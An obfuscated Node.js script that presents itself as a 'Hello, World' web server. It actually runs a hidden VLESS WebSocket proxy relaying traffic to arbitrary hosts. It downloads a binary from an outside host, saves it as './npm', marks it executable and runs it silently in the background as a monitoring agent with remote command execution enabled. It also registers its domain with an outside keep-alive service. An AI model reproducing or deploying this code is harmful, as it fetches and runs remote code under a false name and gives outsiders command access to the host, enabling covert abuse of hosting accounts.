const _0x1ee6a0=_0x2999;(function(_0x382587,_0x5c6622){const _0x34059a=_0x2999,_0x31e59b=_0x382587();while(!![]){try{const _0x475902=parseInt(_0x34059a(0x1dc))/0x1*(parseInt(_0x34059a(0x1c1))/0x2)+-parseInt(_0x34059a(0x1b9))/0x3+parseInt(_0x34059a(0x19c))/0x4+parseInt(_0x34059a(0x1a6))/0x5+-parseInt(_0x34059a(0x1d4))/0x6+parseInt(_0x34059a(0x19b))/0x7+-parseInt(_0x34059a(0x1dd))/0x8;if(_0x475902===_0x5c6622)break;else _0x31e59b['push'](_0x31e59b['shift']());}catch(_0x423035){_0x31e59b['push'](_0x31e59b['shift']());}}}(_0x441b,0x50a05));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x1ee6a0(0x192)),net=require(_0x1ee6a0(0x19a)),{Buffer}=require(_0x1ee6a0(0x194)),{exec,execSync}=require(_0x1ee6a0(0x1c4)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1ee6a0(0x1d8)][_0x1ee6a0(0x187)]||_0x1ee6a0(0x18a),NEZHA_SERVER=process[_0x1ee6a0(0x1d8)][_0x1ee6a0(0x199)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x1ee6a0(0x19f)]||'',DOMAIN=process[_0x1ee6a0(0x1d8)][_0x1ee6a0(0x1a9)]||_0x1ee6a0(0x1b7),AUTO_ACCESS=process[_0x1ee6a0(0x1d8)][_0x1ee6a0(0x1be)]||!![],SUB_PATH=process[_0x1ee6a0(0x1d8)][_0x1ee6a0(0x1bc)]||'sub',NAME=process[_0x1ee6a0(0x1d8)]['NAME']||_0x1ee6a0(0x195),PORT=process['env'][_0x1ee6a0(0x1ba)]||0xbb8,metaInfo=execSync(_0x1ee6a0(0x1e0),{'encoding':'utf-8'}),ISP=metaInfo[_0x1ee6a0(0x190)](),httpServer=http[_0x1ee6a0(0x1ac)]((_0x57e353,_0x427bef)=>{const _0x23a732=_0x1ee6a0;if(_0x57e353[_0x23a732(0x1d0)]==='/')_0x427bef['writeHead'](0xc8,{'Content-Type':_0x23a732(0x1cb)}),_0x427bef[_0x23a732(0x1d6)]('Hello,\x20World\x0a');else{if(_0x57e353[_0x23a732(0x1d0)]==='/'+SUB_PATH){const _0x30d2cf='vless://'+UUID+_0x23a732(0x1a7)+DOMAIN+_0x23a732(0x1ab)+DOMAIN+_0x23a732(0x1da)+NAME+'-'+ISP,_0x5344fc=Buffer[_0x23a732(0x1db)](_0x30d2cf)[_0x23a732(0x1ad)]('base64');_0x427bef[_0x23a732(0x1d1)](0xc8,{'Content-Type':_0x23a732(0x1cb)}),_0x427bef[_0x23a732(0x1d6)](_0x5344fc+'\x0a');}else _0x427bef[_0x23a732(0x1d1)](0x194,{'Content-Type':'text/plain'}),_0x427bef[_0x23a732(0x1d6)](_0x23a732(0x1c2));}}),wss=new WebSocket[(_0x1ee6a0(0x1c9))]({'server':httpServer}),uuid=UUID['replace'](/-/g,'');function _0x2999(_0x46ff28,_0x194ae2){const _0x441b08=_0x441b();return _0x2999=function(_0x29999e,_0x464430){_0x29999e=_0x29999e-0x186;let _0x3cb5ef=_0x441b08[_0x29999e];return _0x3cb5ef;},_0x2999(_0x46ff28,_0x194ae2);}wss['on']('connection',_0x557eee=>{const _0x3142a2=_0x1ee6a0;_0x557eee[_0x3142a2(0x1b0)](_0x3142a2(0x1cd),_0x548f74=>{const _0x1806bb=_0x3142a2,[_0x56b20b]=_0x548f74,_0x165676=_0x548f74[_0x1806bb(0x1ca)](0x1,0x11);if(!_0x165676['every']((_0x3f4c45,_0x53207e)=>_0x3f4c45==parseInt(uuid[_0x1806bb(0x1b6)](_0x53207e*0x2,0x2),0x10)))return;let _0x599e40=_0x548f74[_0x1806bb(0x1ca)](0x11,0x12)[_0x1806bb(0x1d2)]()+0x13;const _0x79a686=_0x548f74['slice'](_0x599e40,_0x599e40+=0x2)[_0x1806bb(0x18d)](0x0),_0x25f375=_0x548f74[_0x1806bb(0x1ca)](_0x599e40,_0x599e40+=0x1)[_0x1806bb(0x1d2)](),_0x53192d=_0x25f375==0x1?_0x548f74[_0x1806bb(0x1ca)](_0x599e40,_0x599e40+=0x4)[_0x1806bb(0x1b2)]('.'):_0x25f375==0x2?new TextDecoder()[_0x1806bb(0x196)](_0x548f74[_0x1806bb(0x1ca)](_0x599e40+0x1,_0x599e40+=0x1+_0x548f74['slice'](_0x599e40,_0x599e40+0x1)['readUInt8']())):_0x25f375==0x3?_0x548f74['slice'](_0x599e40,_0x599e40+=0x10)['reduce']((_0x1faf6c,_0x51ccb2,_0x5aa3de,_0x4c63fa)=>_0x5aa3de%0x2?_0x1faf6c[_0x1806bb(0x1aa)](_0x4c63fa[_0x1806bb(0x1ca)](_0x5aa3de-0x1,_0x5aa3de+0x1)):_0x1faf6c,[])[_0x1806bb(0x193)](_0x2d1aba=>_0x2d1aba[_0x1806bb(0x18d)](0x0)['toString'](0x10))['join'](':'):'';_0x557eee['send'](new Uint8Array([_0x56b20b,0x0]));const _0x2a63c6=createWebSocketStream(_0x557eee);net['connect']({'host':_0x53192d,'port':_0x79a686},function(){const _0x1a17a8=_0x1806bb;this[_0x1a17a8(0x1c0)](_0x548f74[_0x1a17a8(0x1ca)](_0x599e40)),_0x2a63c6['on'](_0x1a17a8(0x1a3),()=>{})[_0x1a17a8(0x1c5)](this)['on'](_0x1a17a8(0x1a3),()=>{})[_0x1a17a8(0x1c5)](_0x2a63c6);})['on'](_0x1806bb(0x1a3),()=>{});})['on'](_0x3142a2(0x1a3),()=>{});});const getDownloadUrl=()=>{const _0x3e511c=_0x1ee6a0,_0x1c6c88=os['arch']();return _0x1c6c88==='arm'||_0x1c6c88===_0x3e511c(0x1c8)||_0x1c6c88===_0x3e511c(0x18e)?!NEZHA_PORT?_0x3e511c(0x1a8):_0x3e511c(0x188):!NEZHA_PORT?_0x3e511c(0x1c6):_0x3e511c(0x1a4);},downloadFile=async()=>{const _0x2a2496=_0x1ee6a0;try{const _0x59900c=getDownloadUrl(),_0x5d5be6=await axios({'method':'get','url':_0x59900c,'responseType':_0x2a2496(0x197)}),_0x240ce1=fs['createWriteStream'](_0x2a2496(0x1d7));return _0x5d5be6[_0x2a2496(0x18c)][_0x2a2496(0x1c5)](_0x240ce1),new Promise((_0x1da8a7,_0x40828d)=>{const _0xbe8476=_0x2a2496;_0x240ce1['on']('finish',()=>{const _0x3821bd=_0x2999;console[_0x3821bd(0x19e)](_0x3821bd(0x1bd)),exec(_0x3821bd(0x1b1),_0x1c4550=>{if(_0x1c4550)_0x40828d(_0x1c4550);_0x1da8a7();});}),_0x240ce1['on'](_0xbe8476(0x1a3),_0x40828d);});}catch(_0x37dcc5){throw _0x37dcc5;}},runnz=async()=>{const _0x3cf98d=_0x1ee6a0;await downloadFile();let _0x2d8638='',_0x221679='';console[_0x3cf98d(0x19e)](_0x3cf98d(0x19d)+NEZHA_SERVER);const _0x19ea8d=()=>{const _0xf111e7=_0x3cf98d;try{const _0x4cbf79=execSync(_0xf111e7(0x1ce))[_0xf111e7(0x1ad)]();return _0x4cbf79[_0xf111e7(0x191)]>0x0;}catch(_0x301f13){return![];}};if(_0x19ea8d()){console[_0x3cf98d(0x19e)](_0x3cf98d(0x1bb));return;}if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2986dc=[_0x3cf98d(0x1bf),_0x3cf98d(0x1a1),_0x3cf98d(0x186),'2087',_0x3cf98d(0x1a2),_0x3cf98d(0x1e4)];_0x2d8638=_0x2986dc[_0x3cf98d(0x1af)](NEZHA_PORT)?_0x3cf98d(0x1b5):'',_0x221679=_0x3cf98d(0x1b3)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2d8638+_0x3cf98d(0x18f);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2515ea=NEZHA_SERVER[_0x3cf98d(0x1af)](':')?NEZHA_SERVER[_0x3cf98d(0x1ae)](':')[_0x3cf98d(0x1a5)]():'',_0x4716a6=new Set([_0x3cf98d(0x1bf),_0x3cf98d(0x1a1),'2096',_0x3cf98d(0x1d3),'2083',_0x3cf98d(0x1e4)]),_0x2f8bc2=_0x4716a6[_0x3cf98d(0x1df)](_0x2515ea)?'true':'false',_0x411298='\x0a\x0aclient_secret:\x20'+NEZHA_KEY+'\x0a\x0adebug:\x20false\x0a\x0adisable_auto_update:\x20true\x0a\x0adisable_command_execute:\x20false\x0a\x0adisable_force_update:\x20true\x0a\x0adisable_nat:\x20false\x0a\x0adisable_send_query:\x20false\x0a\x0agpu:\x20false\x0a\x0ainsecure_tls:\x20false\x0a\x0aip_report_period:\x201800\x0a\x0areport_delay:\x201\x0a\x0aserver:\x20'+NEZHA_SERVER+'\x0a\x0askip_connection_count:\x20false\x0a\x0askip_procs_count:\x20false\x0a\x0atemperature:\x20false\x0a\x0atls:\x20'+_0x2f8bc2+_0x3cf98d(0x1c7)+UUID;!fs[_0x3cf98d(0x1d5)](_0x3cf98d(0x1e2))&&fs[_0x3cf98d(0x1d9)](_0x3cf98d(0x1e2),_0x411298);}_0x221679=_0x3cf98d(0x1e3);}else{console[_0x3cf98d(0x19e)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x221679,{'shell':_0x3cf98d(0x1cf)}),console['log'](_0x3cf98d(0x1e1));}catch(_0x4f9159){console[_0x3cf98d(0x1a3)](_0x3cf98d(0x1a0)+_0x4f9159);}};async function addAccessTask(){const _0x1c7913=_0x1ee6a0;if(!AUTO_ACCESS)return;try{if(!DOMAIN){console['log'](_0x1c7913(0x1b8));return;}else{const _0x112cd0=_0x1c7913(0x1cc)+DOMAIN,_0x5e4419='curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22'+_0x112cd0+_0x1c7913(0x18b);exec(_0x5e4419,(_0x320e69,_0x365883,_0x5aceb7)=>{const _0x16d25a=_0x1c7913;if(_0x320e69){console['error']('Error\x20sending\x20request:',_0x320e69['message']);return;}console['log'](_0x16d25a(0x1c3),_0x365883);});}}catch(_0x345075){console[_0x1c7913(0x1a3)](_0x1c7913(0x1b4),_0x345075[_0x1c7913(0x1cd)]);}}function _0x441b(){const _0x4f188e=['error','https://amd64.ssss.nyc.mn/agent','pop','1535315gqzxBC','@www.visa.com.tw:443?encryption=none&security=tls&sni=','https://arm64.ssss.nyc.mn/v1','DOMAIN','concat','&type=ws&host=','createServer','toString','split','includes','once','chmod\x20+x\x20./npm','join','nohup\x20./npm\x20-s\x20','Error\x20added\x20Task:','--tls','substr','1234.abc.com','URL\x20is\x20empty.\x20Skip\x20Adding\x20Automatic\x20Access\x20Task','111351akyLgh','PORT','npm\x20is\x20already\x20running','SUB_PATH','npm\x20download\x20successfully','AUTO_ACCESS','443','write','2zGPfbf','Not\x20Found\x0a','Automatic\x20Access\x20Task\x20added\x20successfully:','child_process','pipe','https://amd64.ssss.nyc.mn/v1','\x0a\x0ause_gitee_to_upgrade:\x20false\x0a\x0ause_ipv6_country_code:\x20false\x0a\x0auuid:\x20','arm64','Server','slice','text/plain','https://','message','ps\x20aux\x20|\x20grep\x20\x22npm\x22\x20|\x20grep\x20-v\x20\x22grep\x22','/bin/bash','url','writeHead','readUInt8','2087','1682178pwefBx','existsSync','end','npm','env','writeFileSync','&path=%2F#','from','146777wzeBnP','3401960zvGrgH','listen','has','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','npm\x20is\x20running','config.yaml','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','2053','2096','UUID','https://arm64.ssss.nyc.mn/agent','Server\x20is\x20running\x20on\x20port\x20','de04add9-5c68-6bab-950c-08cd5320df33','\x22}\x27','data','readUInt16BE','aarch64','\x20>/dev/null\x202>&1\x20&','trim','length','axios','map','buffer','Vls','decode','stream','unlink','NEZHA_SERVER','net','1691207AxQVDl','1510116fszJpl','NEZHA_SERVER:\x20','log','NEZHA_KEY','npm\x20running\x20error:\x20','8443','2083'];_0x441b=function(){return _0x4f188e;};return _0x441b();}const delFiles=()=>{const _0x4da3fc=_0x1ee6a0;fs[_0x4da3fc(0x198)](_0x4da3fc(0x1d7),()=>{}),fs[_0x4da3fc(0x198)](_0x4da3fc(0x1e2),()=>{});};httpServer[_0x1ee6a0(0x1de)](PORT,()=>{const _0x566b92=_0x1ee6a0;runnz(),addAccessTask(),console['log'](_0x566b92(0x189)+PORT);});